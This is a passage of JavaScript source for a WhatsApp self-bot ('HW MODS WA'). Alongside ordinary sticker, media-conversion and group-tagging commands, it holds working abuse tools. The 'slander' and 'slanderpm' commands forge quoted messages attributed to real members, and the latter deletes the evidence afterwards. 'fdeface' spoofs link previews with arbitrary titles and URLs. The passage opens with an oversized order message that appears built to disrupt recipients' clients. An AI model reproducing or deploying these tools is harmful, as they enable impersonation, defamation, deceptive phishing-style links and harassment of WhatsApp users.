laRzGmUiBOeVR0redWZZLJ8DmK74Hevn+/ga0vJrdwCY3K589+tViSUmTltoGEk0bZV2HqDRdncyxSeJG3hydOZe/oR3FCnpT6JygbjffY1uzBIl7y/jezDXAc8zcrRxtgj1yQdj2+flQptTJDB9EbMBBYF9iDnBJ/Kpzg20tb+S5tb2ESr4XMM9sEfv8AnUnf2VtAyRRRKltF0T7R9TWDkovijZRbXJsoc9k0ExSYjmABAB60Xo0XNcpyjpvT+tktdNIepAAx0FPaTA0cIk3DNWnrszdLRZ0OF6U5G5idXjJVx0IqJVplA99vOuhPOP6s/EUUZljiukvLeWy1A80MwK8x2xVH1jhq/wBOmbELzQA+7Ki5GPUdqmluZhgHl+6pLTdZmtyBK58MbYxkCm5UVFWUWy0e/v5Alvayv5nlIA+J6Uq16C6eYBg4wRnalWXzo6FhbWykymhZDRMvWhJD1rc5TQfZkS2nXqDtMD96/wBquFv4hU+KoV8/0tzbfHAqkeytsxaovk0ZHzDVeY5C0roY3ULjDHGG+G9UgG7OG2kMkkyM0nORnPSiTBZ9jIPlQVvNGkk6PIisJCcE4NEhwRswI9DQB01tbsMc+R5MlDS6RYyK3NBbn1KAUbbwSTkcg2+0egqp+1Th6/n0VrvS7u5JhGZ7dXIV08wB3FAErHwnp90ys1tFyDowz+FE6npVvp9siWKckSbFSc/OqP7HuMeYroeoye8B/hpGPUfYP6Vp+ox+PBImccw2PkamUbRUXTsp6zG25mlH8v03NcJeWOo8whmUumxwcEGnNRhZkKMMMDuKqlzpgWUvHzwyk55l2zXDJ8ej1/Gwxyq7plla3kVyBMxGO5qo8T8InUAZ7RgLodQ2wcfvVi0+W6aPEgDEbcxOC3yo+Es2Sy4og6doxyw7cZGHXenXNlM0d1C8bKce8Nj8D3rqysp7uYRWkLyv5KM4+Nbm8KSxlJEDoTnlYZBoC8uobOPwrZFMnZVAAX41u8tK2cyxd9FRs7Q6Bp7IzKdSnGWPUIOwpCO4vrNbpuUkAhwNsY7inbyB5HZ2y8rn5k0dqVsbLRVt1GWZcPjv5/rU43yfIMq4riUGSN767Y4IjXp8KmYowI0wPhVgsLFbLTvD5VaV8BsjOSev61a9J03TrxDmGAOvu8pXetkrMJMz0IdjXvh+lab/AMMWDKMwxg47MRTL8IWbdEcf9slXxIM78IY3H4UHqV5a2EYNw3vHog3JrvjDXNO0+Z7TRnknuEPK8rEFFPcDz/31qgTzSXEzSTOXc9STSoC5afxlDanlMEvh+WRSqk0qh4ot2aRyyiqRoUxwCaBlY9TRUzbGgZTWhmXn2UuPpWpp5pGcfAn960UVmHsrfGs3i+dvn7mH71poPSqQFE49gVjcyY94Rnf5UZ7OuEjd2sGo6kzi3IBihBI5/U+lWlOH01K9M18oNoB9Q/5n9qsiFI48KoVFGAqjAA8hUqPYx1VCIFRQqgYAA2FcsAV3wR3ryKZZowy9Om9dVQGA+1HhOTQNV/iulKyWUjh8pt4L5/AVevZ9xgvEem/R7twNSgH8wfbH2h+tXfUrO3v7Ke1u41kglUqynvXzlr2nahwLxMk1qzcisWglI2dfsn8jQBul7aiccw92QdD5/GoWaLw25ZkIb8/hRvCuvW3Emkpd2pCy/VlizujdxUnJCsilZFDDyNZzxqRpDI4lWkuBGMRx5+O1CS39woPJGmas0mkwv9Ush8utDHRGztMPmn965niyejojlh7KrLeX8ux91fIbVwkMxAUIWYnYDqauEeiIGBkmLeijFH29pBajMUYDEfWO5NC8eUnchvyIpfSisafpJhX6Rd48QfVTsv8Aembm2+k3Ku4HhR7n1NWm4tzLu2VXue9MPZpgKo90dzXUsaiqRyym5O2V6O1aWTxGGFA90Y3+NP20TQsChYEHIxU0LXB6ZxSS1DZ23p8SbHtPvRMBHLtKP/Kq37Q+LrTR9IuLW1uFfUplKIsbAmPOxY+VSetWAm0u8iDMjFCoZTgjI/vXzhNG0czxuMOrEH4inRJzXhr3vvSoA8pV7SoAvTqztyqCWPQCvTpV8+CltI3far7oNno0djFM0ZeZ0HMS+cHvRxXTCGPhfzOgbmrOXK+i0o+yp8BwT6brUkt3E0UbQsmW88g4/CtQ0lku7j3CHRDlv2qvQrpaLloH5sb4frVt0m3htLRDCnIrkOQTk/7xTg5extQrol17+QobqzKfjRMTK6+7TEq8r5FaEDFo/LPKnbqKIdsd6AVgmpY7MMUcBzHagDhnJHKO9QPF3D1rr2jS2V0oDn3o5Mbo3Y1YSBEpbqaFLmQnIoA+ctHvtQ4D4odLlGwp5ZowdpE8x+YrfNH1G21WxiurR1kgkGVYfl8agfaDwdFxHpxeBVXUYVzE/Tm/0n0rKuBuJrrhPWHstQEi2hflljbrG32h+tAG/mNSOuK8EIx9fFeRTJcW8UsLho5FDKynYg08iEgZoAbEKjq33V7hFGVXf1p4rXnLvQAG6FyC24zS8Eg9Mii+XpXQAIoABSHLHNdpAFfPY0SwCj1NJB71AEffwj6PP61818W2zWvEV/EwxiUn796+n5V8WKUAdGxXz/7XLf6PxfI3LgSxKw/L9KGIpPevDXrUqQHg6Uq9FKgDZuCnD295GVJKsrfeMfpVmjhQoCyY+VVHgJyb+7jzs0YbHwP96uzfVIBxt2pAc2VrFPeRwchIJ94hdgKudygCbDFV/hu1YNLLlmVMAFjkk1ZZRzR7U0MFt5SgGx22xRLkOmRuD0oHZWIpmV5Vy0ZGPs0wObja9hY/axUmJEQEsagZLsyTxJKMMGG/zo6UlsUAO3FxzkBRtXEZwd+9eQR8wJJ716y4NAD+NtqzT2o8FfxWNtS02L/HRjLoo/5ij9a0cMRTiYwWPQUAYd7M+NW02SPSNUbFqXxFI3+Uc/VPp+VbiuCvNnasW9pvB0izXGr6bH7hJeaJR0H2h+tH+yzjczxx6Nqkn85Ri3lY/WH2T6+VAGu4zuK8xvTUEwYU6DQB4wrzFODpXhGBQANKcuB2p1MYGaFmP8wfGlfzGK0Yr9YjA+NAHelsZo3PZmJH31jft5jjj1TTGVTzlJAW7HBXb8a1vS5JI7P8FxWV+3xOX+Bscc5E3Ty9ygDJT19KVIbivM0hHoPWlXi9aVAGqcFSCPXcEgB4mG5+B/StBY4FZtwo/h8RWvk3Mv4GtR0+IXF5Ap3Utk/AUgZNWDG0tkidcZ3PxNSdu4eLbeupIw+zAEUwITbtzR7oeoqgGLpCrZFNsvOnMtHyoJY8jrUcC0LkMPdNAyNnTFzFnGecVJdRQOoApcRsN1yKPU+7mgDyIlTt0p1m8+nnUHxO00FhHcQOyPFKp2OAfQ+nSovVLKS006DVY7mY3bcrMzHY5HYeVYTzOLarR6Hj+Cs0Yyc65Ol/stkeGmCcy82Nlzv91d6hcw2Vvz3EgRPM96r6aelrqmkSvJI15OS8rE9dv70LqV3HNxUy3kck0MC4SJF5t8DtSedpdo0x+BGc6TtU2/8AnXRN2t9Z34P0aRZMbMpG+PhWQe0/gl9Duf4tpCkWDNzMqdYW9PT8q0iNXfX4Lmz0+4t4CvLLzR8o+OPuq0zQR3dpJbzoskTgqynoRV4puadnP5fjxwySjpr+DK+AuPo7q1W21NmF5GMZAz4g8/j51oEOu2L2puPHUIDgg9c/CsB4k0G84e1B7yy51t4piqyL1jYHoavvsv1q21SWb6SIxfKoIQ9+uSo+6pc5tpw0y44cMIyjmtSX9mm6bqdpqCt9FlDFeo6EVzqmqWtgoFxKFYjIUbk/Kq9ofKOKNQZMLGFOQBtnI/vTWisdTvb24mhZvFPKJT0jXuB64xULPJpL27/o6Jf4/HGcpd8Uk/336J4TLMIpEzyuAwyMbGozUbxrrVhZRHCpgNjrnvR9pKlwIZI1KxsPdB8qjtAsWTU9RupM80kxwD2866U7SPLnHjJosUESqqIowqjFYz7f7gPrem2oP/JgLkerN/8AmtthXFfOHtYv/p/Gt+ynKwkQj5Df8c02ZlNXrXrdcivOlI0gD9A0yTWdXttPgkjjlnblVpM8oPrilXOh3p03WbK9XrBMkmPMAgkUqEBdtCbk12xOcZlA+/atWiBiYNGSrDoRWRWT+Fqdo/2ZkP8A5CtdoQE/purq4Ed0Qj9A3Y/tUo8yDuDmqS5G3qadinliAEcjAeXaiwLX4gBJXpTc7wyLlm5TUHHqLDaRM+qnFdnUbf8Arcqe/MtDaWxpXo81B+Zfd7HrUnaxGRFcH3GANQ9xfWbIQLhMntT2i6qnI8KEP4e4x5Uclex8XWhzi6IroUoUFizKAAPWhtft2Oi6facp5pJIoyPlVlhmEqBlPUV0aiWPk2/ydWHyvjjFV9rbKvqzMOLtOUA8ip5bb5/tXGp2F9a63/EtNiE3OOV4871ZnJOwr1RUvCnff7NI+c4cajpU/wBlesf4td6iJ7sG1tVGPBDZ5qJt5buLX3imcG1kjLRjbty5/Opd12ocW8YuWn5SZSoXJPQeQqljr2Zy8lTbuKSqlRFNw+k7apHeLFLZ3hDBOpB33/GsN4p4c1HgnWYrq1kbwefmgmXt/pNfSKHbeo/XNIttWsJbS8jEkTjG46VUYqKpGGTLLI+Utme+zzXYNUFxcmVRfNgyw4xjfqN9x0q2aPpctnJdGCdTBKMxoRnlb1rEuItG1HgfiBJrdm8LmzDL2YfZNbLwBxDa8Q6UZYWVbhMCWLO6H9vWpWKKr9Gr8zLK7e6X8aJeSEW6xBMkJgZPenLRQzSMuxLk0RNHlTneoqG/tbK5Zb2dIFdvdMhwCfLNaaOdtydsmZ3MNpJIQchSa+TNWna6v7m4fPNLKznPqa+r768tXsXKXMLIR1EgI/OsM4j4WfUFmlso0NyZCw7cwz0qJZFFpMcYOSbRm2KXbepa64d1e1J8XT7jHmqcw/Chv4Vf+G7m0nVEGWZkKgD50+SJpgApUqVOxFzmYqeYHcHIrZkYOgdcYYZFKlQA3LzcuVUscjYGvA0pA/ksf/kKVKkB7mTO8LD5im54iyEjO/nSpVll9G2Eh543V6kOHreTxJLvfY+Go8/M0qVYYUuZ0Zn9FlotLgxN/pqXSUSICvQ0qVdxxI9ArvG1KlQAj0rjHpSpUAedOldg5G/lSpUARfEWgWev6fJZ30fMjDZh1U+Yr5/vbfVPZzxaGhfxFQ+63RZk8jSpUAbnw9xDZ6/pMd5Zt7rbMh6o3cGs+9sbkTaPEGwrmViPPHL+9KlUy0VHpld4LszJqcrkAhQF++tOtrUIF2GcUqVcaVybOtukkEEKOwqpe0GZYuH7sjbKFR86VKq9kPRh+PKlSpV1nIf/2Q==",
"itemCount": 2021,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "HW MODS WA ~ Hacker 404",
"message":"Hallo Kak",
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:mek, contextInfo:{}}) 

Haikal.relayWAMessage(res)
break
// Link Group ( HW MODS WA )
case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
linkgc = await Haikal.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n_Nyo bisa nyo ramein_`
Haikal.sendMessage(from, yeh, text, { quoted: mek })
break
// Add Members ( HW MODS WA )
case 'add':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin!')
if (!isGroup) return
if (args.length < 1) return reply(`what's the number?`)
reply('The add feature is blocked bro')
/*
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
Haikal.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply(`can't add number, looks like it's private`)
}
*/
break
// Owner Contact Array ( HW MODS WA )
case 'owner':
case 'admin':
let ini_list = []
for (let i of ownerNumbers) {
const vname = Haikal.contacts[i] != undefined ? Haikal.contacts[i].vname || Haikal.contacts[i].notify : undefined
ini_list.push({
"displayName": 'HW MODS WA',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${Haikal.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await Haikal.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek })
Haikal.sendMessage(from,'Nih Kak Owner Ku ><',text,{quoted: hehe})
break
// Delete Private Message ( HW MODS WA )
case 'deletepc':
if (!mek.key.fromMe && !isOwner) return
anu = await Haikal.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
for (let _ of anu) {
Haikal.modifyChat(_.jid, 'delete', {
includeStarred: false
})
}
await reply(`Berhasil menghapus ${anu.length} pribadi chat`)
break
// Online ( HW MODS WA & HAIKALz )
case 'on':
if (!mek.key.fromMe && !isOwner) return 
offline = false
freply(' ``ANDA TELAH ONLINE``` ')
break
// Status Bot ( HW MODS WA )
case 'status':
case 'mystat':
case 'botstat':
fkhs = sender
teks = `\`\`\`「 Status Bot 」\`\`\`

*${ucapanWaktu}* @${fkhs.split("@")[0]}
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}

*•> Base :* HW MODS WA
*•> Recode :* HAIKAL - HW BOT
*•> Lib :* Baileys, ${bailver}
*•> Prefix :* ${prefi}
*•> Versi Bot :* ${botver}

*•> Merk HP :* ${device_manufacturer}
*•> Versi OS :* ${os_version}
*•> Versi HP :* ${device_model}
*•> MCC :* ${mcc}
*•> MNC :* ${mnc}
*•> Baterai :* ${isBattre}
*•> Charger :* ${isCharge}

*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
*•> Runtime :* ${kyun(run)}

*${offline ? "OFFLINE" : "ONLINE"}*
*${banChats ? "SELF-MODE" : "PUBLIC-MODE"}*`
Haikal.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[fkhs], "externalAdReply":flink}})
break
    case 'off':
            if (!mek.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
            freply(' ```ANDA TELAH OFFLINE``` ')
            break   
    case 'get':
            if(!q) return reply('linknya?')
            reply(mess.wait)
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
    case 'kontag':
            if (!mek.key.fromMe && !isOwner) return reply('SELF-BOT')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            Haikal.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'slander':
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            Haikal.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'slanderpm':
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await Haikal.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await Haikal.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'reverse':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            Haikal.sendMessage(from,media,image,{quoted:mek,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            Haikal.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'take':
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `SELF`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : `BOT`
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, Haikal, mek, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            Haikal.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./lib/data.exif', out, '-o', _out])
            .on('exit', () => {
            Haikal.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            Haikal.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./lib/data.exif', out, '-o', _out])
            .on('exit', () => {
            Haikal.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
            if (!mek.key.fromMe && !isOwner) return
            if (!q) return fakestatus('Isi teksnya!')
            Haikal.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
            if (!mek.key.fromMe && !isOwner) return
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await Haikal.downloadMediaMessage(swsw)
            Haikal.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            Haikal.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
    case 'upswvideo':
            if (!mek.key.fromMe && !isOwner) return
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await Haikal.downloadMediaMessage(swsw)
            Haikal.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            Haikal.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('reply videonya!')
            }
            break
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const tipes = await Haikal.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await Haikal.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		Haikal.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'antibug':
          if (!mek.key.fromMe && !isOwner) return
          if (args[0] === 'on') {
          if (bugc === true) return
          bugc = true
          antitrol = true
          reply('Berhasil menyalakan antibug')
          } else if (args[0] === 'off') {
          if (bugc === false) return
          bugc = false
          antitrol = false
          reply('Berhasil mematikan antibug')
          } else {
          reply('Pilih on atau off')
          }
          break
    case 'public':
          	if (!mek.key.fromMe && !isOwner) return fakestatus('SELF-BOT')
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	freply(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!mek.key.fromMe && !isOwner) return fakestatus('SELF-BOT')
          	if (banChats === true) return
